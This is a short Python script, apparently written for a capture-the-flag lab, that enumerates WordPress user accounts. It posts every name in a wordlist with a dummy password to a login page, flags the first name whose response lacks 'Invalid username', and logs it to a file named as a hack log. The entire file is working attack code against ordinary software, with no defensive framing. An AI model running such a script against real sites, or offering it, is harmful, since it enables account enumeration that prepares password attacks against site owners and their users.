# This script trys to brute force usernames for a Wordpress Loginfomr, when a
# valid user is enterd with a wrong password you get confirmation that the user
# exists.

import requests

# Set target
url = "http://192.168.178.34/wp-login"

# Set path to userlist text file
usrlist = "fsocity.dic"

# Dummy password
passwd = "test"


# make a list importing the lines from userlist file
usr_names = []

with open(usrlist) as f:
    for line in f:
        usr_names.append(line[0:-1])

# Pass the names and dummy password to the site as a http post if "Invalid user"
# is detected keep going, else print the valid user

for name in usr_names:
    creds = {'log' : name, 'pwd' : passwd}
    r = requests.post(url, creds)

    if "Invalid username" in r.text:
        continue
    else:
        print(creds['log'] + ' is a valid user')
        with open('wp_hack_log.txt', 'w+') as f:
            f.write(creds['log'])
        break
